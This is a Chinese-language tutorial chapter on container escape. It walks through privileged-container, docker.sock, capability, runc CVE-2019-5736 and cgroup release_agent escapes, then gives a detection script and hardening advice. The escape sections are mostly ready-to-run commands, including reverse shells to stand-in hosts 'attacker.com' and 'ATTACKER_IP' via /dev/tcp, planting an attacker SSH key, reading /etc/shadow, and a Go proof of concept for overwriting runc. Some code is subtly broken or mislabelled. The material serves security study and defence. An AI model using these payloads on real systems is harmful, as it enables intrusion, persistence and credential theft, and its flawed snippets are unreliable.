# 容器逃逸技术深度剖析

## 概述

容器不是沙箱——它只是一个被 Linux namespace 和 cgroup 包裹的进程。多年来的容器逃逸漏洞（CVE-2019-5736、CVE-2022-0492 等）反复证明：攻击者一旦突破容器边界，就能获得宿主机 root 权限。

---

## 1. 容器逃逸原理

### 1.1 攻击面概览

```
容器攻击面:
┌─────────────────────────────────┐
│          Host OS (宿主机)        │
│  ┌─────────────────────────┐   │
│  │ Docker Engine (daemon)  │   │ ← 高危目标 (root 运行)
│  │   - Docker Socket      │   │
│  │   - docker-proxy       │   │
│  │   - containerd         │   │
│  └────────┬────────────────┘   │
│           │                     │
│  ┌────────┴────────────────┐   │
│  │ Container (逃逸起始点)   │   │
│  │  1. Privileged Flag    │   │ ← --privileged
│  │  2. Volume Mounts      │   │ ← /var/run/docker.sock
│  │  3. Capabilities       │   │ ← CAP_SYS_ADMIN 等
│  │  4. Kernel Exploit     │   │ ← dirty pipe, etc.
│  │  5. runtime bug        │   │ ← runc CVE-2019-5736
│  └─────────────────────────┘   │
│           ↓                     │
│  ┌─────────────────────────┐   │
│  │  Linux Kernel           │   │ ← 内核是共享的
│  │  (namespace/cgroup)     │   │
│  └─────────────────────────┘   │
└─────────────────────────────────┘
```

### 1.2 逃逸技术分类

```yaml
容器逃逸技术矩阵:
  配置类 (可防可控):
    - Privileged 容器逃逸
    - Docker Socket 挂载逃逸
    - Host Path 挂载逃逸
    - Capabilities 滥用

  Runtime 漏洞类 (需升级):
    - runc 漏洞 (CVE-2019-5736)
    - containerd 漏洞
    - CRI-O 漏洞

  内核漏洞类 (需打补丁):
    - Dirty COW (CVE-2016-5195)
    - Dirty Pipe (CVE-2022-0847)
    - Overlayfs (CVE-2023-0386)
```

---

## 2. 配置类逃逸

### 2.1 Privileged 容器逃逸

```bash
# 场景: --privileged 容器 → 挂载宿主机磁盘 → chroot 逃逸

# 1. 列出块设备
fdisk -l

# 2. 挂载宿主机根分区
mount /dev/sda1 /mnt

# 3. 逃逸到宿主机
chroot /mnt /bin/bash

# 4. 写入 SSH key 建立持久化
echo "ssh-rsa AAA... attacker" >> /mnt/root/.ssh/authorized_keys

# 5. 反弹 shell 到宿主机
cat > /mnt/etc/cron.d/escape << 'EOF'
*/5 * * * * root bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
EOF

# 在宿主机视角查看:
ps aux | grep "sleep 9999"  # 容器内进程在宿主机可见
# root 9998 ... sleep 9999   ← PID namespace 未启用
```

### 2.2 Docker Socket 挂载逃逸

```bash
# 场景: 容器内 /var/run/docker.sock 可用

# 方法 1: 直接运行特权容器
docker -H unix:///var/run/docker.sock run \
    -v /:/host \
    --privileged \
    -it alpine chroot /host /bin/bash

# 方法 2: 使用 docker-compose
cat > /tmp/docker-compose.yml << EOF
version: '3'
services:
  escape:
    image: alpine
    volumes:
      - /:/mnt
    command: ["chroot", "/mnt", "/bin/sh"]
EOF

docker -H unix:///var/run/docker.sock compose -f /tmp/docker-compose.yml up

# 方法 3: 创建特权 Pod (K8s)
docker -H unix:///var/run/docker.sock exec -it $(docker ps -q) /bin/bash

# 获得宿主机 shell 后
ps aux | grep docker
cat /etc/shadow  # 宿主机密码文件
```

### 2.3 Capability 滥用逃逸

```python
# 检查当前容器的 Capabilities
import os
import subprocess

def check_capabilities():
    """检查哪些危险 capability 可用"""

    dangerous_caps = {
        'CAP_SYS_ADMIN': '挂载文件系统、创建 namespace',
        'CAP_SYS_PTRACE': '注入到其他进程（包括宿主机进程）',
        'CAP_SYS_MODULE': '加载内核模块',
        'CAP_SYS_RAWIO': '直接访问 I/O 端口和内存',
        'CAP_SYS_TIME': '修改系统时间（影响 Kubernetes 证书）',
        'CAP_NET_RAW': '原始套接字（ARP 欺骗、SYN Flood）',
        'CAP_NET_ADMIN': '修改网络配置',
        'CAP_DAC_OVERRIDE': '绕过文件权限检查',
        'CAP_DAC_READ_SEARCH': '读取任何文件',
        'CAP_SYSLOG': '读取内核日志（可能泄露信息）',
    }

    # 读取 capability 位
    cap_data = open('/proc/1/status').read()
    print("当前 capability 集:")
    for line in cap_data.split('\n'):
        if 'Cap' in line:
            print(f"  {line}")

    # 利用 CAP_SYS_ADMIN
    if os.geteuid() == 0:  # root in container
        # 创建新的 namespace → 逃逸
        os.system('unshare -m sh -c "mount -t proc proc /proc && chroot / /bin/bash"')

# CAP_SYS_PTRACE 逃逸技术
def sys_ptrace_escape():
    """
    CAP_SYS_PTRACE: 注入到宿主机进程

    1. cat /proc/1/cgroup → 找到宿主机 cgroup
    2. 在宿主机上启动一个进程
    3. ptrace 附加到该进程 → 注入 shellcode
    """

    # 查找容器 init 进程在宿主机的 PID
    with open('/proc/1/sched') as f:
        # 提取宿主机 PID (位于 ns 外部)
        pass

    # 使用 nsenter 逃逸 (如果有 CAP_SYS_ADMIN)
    os.system('nsenter -t 1 -m -u -i -n -p -- /bin/bash')
```

---

## 3. Runtime 漏洞逃逸

### 3.1 CVE-2019-5736 (runc)

```yaml
CVE-2019-5736 (runc 容器逃逸):

  原理:
    1. 攻击者在容器内覆盖 /proc/self/exe
    2. /proc/self/exe 指向 runc 二进制文件 (在宿主机)
    3. 当宿主机执行 docker exec 时 → 执行被篡改的 runc

  利用流程:
    1. 在容器内: 获取 runc 的文件描述符 (指向宿主机二进制)
    2. 在容器内: 打开 /proc/self/exe 为只读 → 获取 fd
    3. 在容器内: 重新打开为 O_WRONLY
    4. 等待宿主机执行 docker exec
    5. 宿主机调用 runc → 执行攻击者的恶意二进制

  影响版本:
    - docker < 18.09.2
    - runc <= 1.0-rc6

  检测:
    docker version
    runc --version
    # 确保 runc >= 1.0.0-rc7
```

```go
// CVE-2019-5736 Exploit (概念验证)
package main

import (
    "fmt"
    "os"
    "strconv"
)

func main() {
    // 1. 获取 runc 的文件描述符
    fd, err := os.Open("/proc/self/exe")
    if err != nil {
        panic(err)
    }
    defer fd.Close()

    // 2. 查找宿主机 runc 进程
    // (简化 - 实际需要遍历 /proc 找到 runc 进程)
    for pid := 1; pid < 65535; pid++ {
        cmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
        if string(cmdline) == "runc" {
            // 3. 通过 /proc/PID/exe 获取宿主机 runc 的 fd
            hostFd := fmt.Sprintf("/proc/%d/exe", pid)
            // 4. 覆盖 runc 二进制
            os.WriteFile(hostFd, maliciousPayload, 0755)
            break
        }
    }
}
```

### 3.2 CVE-2022-0492 (Cgroup v1)

```bash
# CVE-2022-0492 - 利用 cgroup v1 release_agent 逃逸

# 条件: CAP_SYS_ADMIN capability

# 1. 创建新的 cgroup
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp

# 2. 创建子 cgroup
mkdir /tmp/cgrp/x

# 3. 设置 release_agent (当 cgroup 为空时执行的程序)
echo '#!/bin/bash' > /cmd
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /cmd
chmod +x /cmd

# 4. 通知内核执行 release_agent (宿主机视角)
echo "$(cat /cmd)" > /tmp/cgrp/release_agent

# 5. 触发 release_agent (清空 cgroup)
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# → 宿主机执行 /cmd → 反弹 shell
```

---

## 4. 逃逸检测

### 4.1 检测脚本

```bash
#!/bin/bash
# container_escape_check.sh - 容器逃逸风险检测

echo "=== 容器逃逸风险检测 ==="

# 1. 检查是否为 privileged 容器
if mount | grep -q 'cgroup.*rw'; then
    echo "[CRITICAL] Privileged 容器检测: 可以读写 cgroup"
fi

# 2. 检查 Docker Socket
if [ -S /var/run/docker.sock ]; then
    echo "[CRITICAL] Docker Socket 挂载检测"
    ls -la /var/run/docker.sock
fi

# 3. 检查危险挂载
dangerous_mounts=(
    "/proc:/"
    "/sys:/"
    "/:/host"
    "/var/run/docker.sock"
    "/etc/:/etc/"
)

for mount in "${dangerous_mounts[@]}"; do
    if mount | grep -q "$mount"; then
        echo "[HIGH] 危险挂载: $mount"
    fi
done

# 4. 检查 Capabilities
if cat /proc/1/status | grep -q "CapEff:.*ffffffff"; then
    echo "[CRITICAL] 所有 Capabilities 启用"
fi

# 5. 检查内核漏洞
uname -r
echo "  检查 https://www.kernel.org 确认内核版本是否受影响"

# 6. Pod 安全上下文检查 (K8s)
if [ -n "$KUBERNETES_SERVICE_HOST" ]; then
    echo "[INFO] Kubernetes 环境检测"
    # 检查 service account token
    if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
        echo "[WARNING] Service Account Token 可访问"
    fi
fi
```

### 4.2 加固建议

```yaml
容器安全加固基线:
  1. 最小权限原则:
    - 禁止 --privileged
    - 禁止挂载 docker.sock
    - 禁止挂载宿主机敏感路径
    - 最小化 Capabilities (只保留必需的)

  2. 安全上下文:
    - runAsNonRoot: true
    - readOnlyRootFilesystem: true
    - allowPrivilegeEscalation: false

  3. Runtime 安全:
    - runc >= 1.0.0-rc7 (修复 CVE-2019-5736)
    - containerd >= 最新版
    - 内核 >= 5.8 (多安全特性)

  4. 运行时检测:
    - Falco (容器运行时安全)
    - seccomp profiles
    - AppArmor/SELinux
    - PodSecurity Admission (K8s v1.25+)

  5. 监控告警:
    - 监控容器内挂载操作
    - 审计: exec、mount、chroot、nsenter
    - 告警: 容器写入 /etc/ /root/ 等敏感路径
```

---

## 参考资源

- [CVE-2019-5736](https://nvd.nist.gov/vuln/detail/CVE-2019-5736)
- [CVE-2022-0492](https://nvd.nist.gov/vuln/detail/CVE-2022-0492)
- [Kubernetes Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)

---

*上一篇：[容器安全工具链](./04-container-image-security.md)*
